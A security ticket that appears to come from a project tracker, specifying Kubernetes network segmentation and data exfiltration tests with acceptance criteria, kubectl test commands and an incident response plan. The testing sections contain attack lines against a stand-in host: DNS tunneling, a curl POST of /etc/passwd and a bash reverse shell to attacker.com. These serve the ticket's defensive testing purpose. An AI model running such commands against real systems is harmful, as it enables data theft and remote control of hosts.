# SEC-007: Network Segmentation & Data Exfiltration Testing

**Priority**: P0 | **Status**: 📋 Backlog K  | **Story Points**: 13
**Linear URL**: https://linear.app/bvlucena/issue/BVL-251/sec-007-network-segmentation-and-data-exfiltration-testing

**Priority:** P1 | **Story Points:** 8

## 📋 User Story

**As a** Principal Pentester  
**I want to** validate network segmentation and prevent data exfiltration  
**So that** lateral movement and unauthorized data transfer is blocked

## 🎯 Acceptance Criteria

### AC1: Network Policy Enforcement
**Given** Kubernetes Network Policies define traffic rules  
**When** attempting unauthorized network communication  
**Then** connections should be blocked

**Security Tests:**
- ✅ Default deny ingress/egress enforced
- ✅ Cross-namespace communication blocked (unless explicit)
- ✅ Internet egress restricted to allowed services
- ✅ Pod-to-pod communication controlled
- ✅ Service mesh policies enforced (if using Istio/Linkerd)

**Test Scenarios:**
```bash
# Test cross-namespace access
kubectl run -it --rm test-pod --image=busybox --restart=Never -n namespace-a -- \
  wget -O- http://service.namespace-b.svc.cluster.local
# Expected: Connection timeout

# Test internet access
kubectl run -it --rm test-pod --image=busybox --restart=Never -- \
  wget -O- https://attacker.com
# Expected: Connection timeout (unless whitelisted)
```

### AC2: Egress Filtering
**Given** pods may attempt outbound connections  
**When** connecting to external services  
**Then** only whitelisted destinations should be accessible

**Allowed Egress:**
- ✅ AWS services (S3, ECR, CloudWatch) via VPC endpoints
- ✅ DNS (port 53)
- ✅ NTP (port 123)
- ✅ Specific external APIs (whitelisted FQDNs)

**Blocked Egress:**
- ❌ Arbitrary internet access
- ❌ Tor exit nodes
- ❌ Known malicious IPs
- ❌ Cryptocurrency mining pools
- ❌ Data exfiltration services (pastebin, file sharing)

### AC3: Data Exfiltration Prevention
**Given** attackers may attempt to steal data  
**When** using common exfiltration techniques  
**Then** data transfer should be blocked

**Exfiltration Techniques to Test:**
- ❌ DNS tunneling: `nslookup <base64-data>.attacker.com`
- ❌ HTTP POST to external site
- ❌ ICMP tunneling (ping with data)
- ❌ SSH tunnel to external server
- ❌ Reverse shell: `bash -i >& /dev/tcp/attacker.com/4444 0>&1`
- ❌ Cloud storage upload (unauthorized)

**Detection Mechanisms:**
- ✅ Network traffic monitoring
- ✅ DNS query anomaly detection
- ✅ Data transfer rate limiting
- ✅ Connection count limits

### AC4: Service Mesh Security
**Given** service mesh may be used for traffic management  
**When** testing mTLS and authorization  
**Then** service-to-service communication should be authenticated

**Security Tests:**
- ✅ mTLS enforced between services
- ✅ Certificate validation active
- ✅ Authorization policies enforced
- ✅ Traffic encryption in transit
- ✅ Service identity validation

### AC5: Pod-to-Pod Isolation
**Given** multiple pods run in same namespace  
**When** one pod attempts to connect to another  
**Then** connections should be governed by network policy

**Security Tests:**
- ✅ Builder pods isolated from parser pods
- ✅ Parser pods isolated from each other
- ✅ Admin pods in separate network zone
- ✅ Monitoring pods have read-only access

**Network Zones:**
```
Zone 1: Builder Service (restricted egress)
Zone 2: Parser Execution (no internet, only S3)
Zone 3: Control Plane (admin access)
Zone 4: Monitoring (read-only)
```

### AC6: Ingress Controller Security
**Given** external traffic enters via ingress  
**When** testing ingress security  
**Then** only authorized traffic should reach services

**Security Tests:**
- ✅ TLS termination enforced (HTTPS only)
- ✅ Certificate validation
- ✅ Rate limiting on ingress
- ✅ WAF rules active (if deployed)
- ✅ DDoS protection configured
- ✅ IP whitelist/blacklist enforced

### AC7: VPC Network Segmentation
**Given** cluster runs in AWS VPC  
**When** testing network isolation  
**Then** proper subnetting and security groups should be enforced

**Security Tests:**
- ✅ Public subnets isolated from private subnets
- ✅ Security groups follow least-privilege
- ✅ No direct internet access from worker nodes
- ✅ NAT gateway for controlled egress
- ✅ VPC Flow Logs enabled
- ✅ No SSH access from internet (only bastion)

### AC8: RabbitMQ Network Isolation
**Given** RabbitMQ brokers handle event traffic  
**When** testing RabbitMQ network security  
**Then** only authorized services should connect

**Security Tests:**
- ✅ RabbitMQ not exposed to internet
- ✅ TLS encryption enforced
- ✅ Virtual host isolation
- ✅ Connection limits enforced
- ✅ Authentication required
- ✅ Management UI access restricted

## 🔴 Attack Surface Analysis

### Network Communication Paths

1. **Internet → Ingress → Services**
   - Entry point: Load Balancer
   - Protection: TLS, Rate Limiting, WAF

2. **Pod → Pod (same namespace)**
   - Entry point: Pod network
   - Protection: Network Policy

3. **Pod → Pod (different namespace)**
   - Entry point: Service DNS
   - Protection: Network Policy (default deny)

4. **Pod → External**
   - Entry point: Node network
   - Protection: Egress filtering, VPC security groups

5. **Pod → AWS Services**
   - Entry point: VPC endpoints
   - Protection: IAM policies, endpoint policies

## 🛠️ Testing Tools

### Network Policy Testing
```bash
# Verify network policies exist
kubectl get networkpolicies --all-namespaces

# Test connectivity between pods
kubectl run -it --rm source-pod --image=busybox -n namespace-a -- \
  nc -zv service.namespace-b 80

# Test egress filtering
kubectl run -it --rm test-egress --image=curlimages/curl -- \
  curl -v https://google.com

# Visualize network policies
kubectl get networkpolicies -o yaml | \
  kubectl-np-viewer --output network-policies.html
```

### Data Exfiltration Testing
```bash
# Test DNS exfiltration
kubectl exec -it <pod> -- \
  nslookup $(echo "sensitive-data" | base64).attacker.com

# Test HTTP exfiltration
kubectl exec -it <pod> -- \
  curl -X POST https://attacker.com/exfil -d @/etc/passwd

# Test reverse shell
kubectl exec -it <pod> -- \
  bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
# Expected: Connection timeout
```

### Traffic Analysis
```bash
# Capture pod traffic
kubectl sniff <pod-name> -n <namespace> -o capture.pcap

# Analyze with Wireshark
wireshark capture.pcap

# Check for unencrypted traffic
tshark -r capture.pcap -Y "http | | ftp | | telnet"
```

## 📊 Success Metrics

- **100%** network policies enforced
- **Zero** unauthorized cross-namespace communication
- **Zero** successful data exfiltration attempts
- **100%** traffic encryption for sensitive data
- **Zero** direct internet access from restricted pods

## 🚨 Incident Response

If data exfiltration is detected:

1. **Immediate** (< 2 min)
   - Block egress from compromised pod
   - Isolate pod with network policy
   - Capture network traffic for forensics

2. **Short-term** (< 15 min)
   - Identify exfiltrated data
   - Review VPC Flow Logs
   - Check DNS query logs

3. **Long-term** (< 1 hour)
   - Strengthen egress filtering
   - Implement DLP controls
   - Update network policies

## 📚 Related Stories

- **SEC-004:** Container Escape & Privilege Escalation
- **SEC-006:** Secrets Exposure & Credential Leakage
- **SEC-008:** Denial of Service & Resource Exhaustion
- **SRE-014:** Security Incident Response

## 🔗 References

- [Kubernetes Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [MITRE ATT&CK: Exfiltration](https://attack.mitre.org/tactics/TA0010/)
- [AWS VPC Security Best Practices](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-best-practices.html)
- [Calico Network Policy](https://docs.tigera.io/calico/latest/network-policy/)

---

**Test File:** `internal/security/security_007_network_segmentation_test.go`  
**Owner:** Security Team  
**Last Updated:** October 29, 2025

